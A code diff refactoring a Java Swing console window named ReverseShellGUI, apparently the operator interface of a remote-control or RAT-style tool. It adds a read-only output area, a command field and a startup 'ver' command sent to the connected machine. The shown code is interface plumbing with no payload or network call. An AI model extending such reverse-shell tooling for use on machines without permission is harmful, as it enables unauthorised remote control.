@@ -3,16 +3,24 @@ package GUI.TableUtils.ReverseShell;
 import Connections.Streams;
 
 import javax.swing.*;
-import javax.swing.text.*;
+
 import java.awt.*;
-import java.awt.event.KeyAdapter;
-import java.awt.event.KeyEvent;
-import java.util.regex.Matcher;
-import java.util.regex.Pattern;
+
+
+/*
+   In this GUI I make the user believe that he is writing directly to the console,
+   it really consists of a textarea and a text field that are responsible for updating the state
+ */
+
+// TODO fix the encoding on display
 
 public class ReverseShellGUI {
     private final Streams stream;
-    JDialog reverseShellDialog;
+    private final JDialog reverseShellDialog;
+    private JTextField fieldOfCommands;
+    private JTextArea textAreaOfResult;
+    private boolean pressedEnter = false;
+    private String lastPath;
 
     public ReverseShellGUI(Streams stream, JFrame mainGUI) {
         this.stream = stream;
@@ -21,55 +29,19 @@ public class ReverseShellGUI {
         reverseShellDialog.setLocationRelativeTo(null);
         reverseShellDialog.setLayout(new GridBagLayout());
         addStyle();
+        getCurrentPathAtStart();
         reverseShellDialog.setVisible(true);
     }
 
 
-    JTextField fieldOfCommands;
-    JTextArea textAreaOfResult;
-    int characterCounter = 0;
-
-    public int getCharacterCounter() {
-        return characterCounter;
-    }
+    // style of text area and field text
 
     private void addStyle() {
         GridBagConstraints constraints = new GridBagConstraints();
         textAreaOfResult = new JTextArea();
-        DefaultCaret caret = (DefaultCaret) textAreaOfResult.getCaret();
-        caret.setUpdatePolicy(DefaultCaret.ALWAYS_UPDATE);
-        ReverseShellGUI a = this;
-        textAreaOfResult.addKeyListener(new KeyAdapter() {
-
-            @Override
-            public void keyPressed(KeyEvent e) {
-                ((AbstractDocument) textAreaOfResult.getDocument()).setDocumentFilter(new DocumentFilter() {
-                    @Override
-                    public void remove(FilterBypass fb, int offset, int length) throws BadLocationException {
-                        //Won't remove
-                        //new Exception("remove " + offset + "," + length).printStackTrace();
-                    }
-
-                    @Override
-                    public void replace(FilterBypass fb, int offset, int length, String text, AttributeSet attrs)
-                            throws BadLocationException {
-                        if (characterCounter > 0) {
-                            super.replace(fb, offset, length, text, attrs);
-                        }
-                    }
-                });
-                if (e.getKeyCode() == KeyEvent.VK_ENTER) {
-                    System.out.println("enter");
-                    stream.getExecutor().submit(new CommandSender(a));
-                } else if (e.getKeyChar() == KeyEvent.VK_BACK_SPACE || e.getKeyChar() == KeyEvent.VK_DELETE) {
-                    characterCounter--;
-
-                } else {
-                    characterCounter++;
-                }
-            }
-        });
+        textAreaOfResult.setFocusable(false);
         textAreaOfResult.getCaret().setVisible(true);
+        textAreaOfResult.setEditable(false);
         textAreaOfResult.setForeground(new Color(24, 177, 0));
         textAreaOfResult.setBackground(Color.BLACK);
         constraints.gridx = 0;
@@ -79,41 +51,51 @@ public class ReverseShellGUI {
         constraints.fill = GridBagConstraints.BOTH;
         constraints.weighty = 1.0;
         JScrollPane textAreaScrollPane = new JScrollPane(textAreaOfResult);
+        textAreaScrollPane.setBorder(null);
         reverseShellDialog.add(textAreaScrollPane, constraints);
         constraints.weighty = 0.0;
 
 
         fieldOfCommands = new JTextField();
-        fieldOfCommands.setForeground(Color.GREEN);
+        fieldOfCommands.setForeground(Color.BLACK);
         fieldOfCommands.setBackground(Color.BLACK);
+        fieldOfCommands.setBorder(null);
+        fieldOfCommands.setCaretColor(Color.BLACK);
+        fieldOfCommands.setCursor(new Cursor(Cursor.DEFAULT_CURSOR));
         constraints.gridx = 1;
         constraints.gridy = 2;
         constraints.gridwidth = 1;
         constraints.gridheight = 1;
         constraints.weightx = 1.0;
         constraints.fill = GridBagConstraints.HORIZONTAL;
+        fieldOfCommands.addCaretListener(e -> textAreaOfResult.setCaretPosition(
+                textAreaOfResult.getText().length()
+                        - fieldOfCommands.getText().length()
+                        + fieldOfCommands.getCaretPosition()));
         fieldOfCommands.addActionListener(new SendCommandAction(this));
-        fieldOfCommands.addKeyListener(new KeyAdapter() {
-            @Override
-            public void keyPressed(KeyEvent e) {
-                Pattern matcher = Pattern.compile("[a-zA-Z]");
-                Matcher mat = matcher.matcher(String.valueOf(e.getKeyChar()));
-                int counter = 0;
-                while (mat.find() && counter == 0) {
-                    counter++;
-                    System.out.println("xd");
-                }
-                if (counter > 0) System.out.println("ENCOUNTRED XD");
-                if (e.getKeyChar() == KeyEvent.VK_BACK_SPACE || e.getKeyChar() == KeyEvent.VK_DELETE) {
-                    if (fieldOfCommands.getText().length() > 0)
-                        textAreaOfResult.setText(textAreaOfResult.getText().substring(0, textAreaOfResult.getText().length() - 1));
-                } else if (true) {
-                    textAreaOfResult.append(String.valueOf(e.getKeyChar()));
-                }
-            }
-        });
+        fieldOfCommands.getDocument().addDocumentListener(new FieldDocumentListener(this));
         reverseShellDialog.add(fieldOfCommands, constraints);
 
+    }
+
+    public String getLastPath() {
+        return lastPath;
+    }
+
+    public void setLastPath(String lastPath) {
+        this.lastPath = lastPath;
+    }
+
+    public boolean isPressedEnter() {
+        return pressedEnter;
+    }
+
+    public void setPressedEnter(boolean pressedEnter) {
+        this.pressedEnter = pressedEnter;
+    }
+
+    private void getCurrentPathAtStart() {
+        stream.getExecutor().submit(new CommandSender(this, "ver"));
     }
 
     public Streams getStream() {
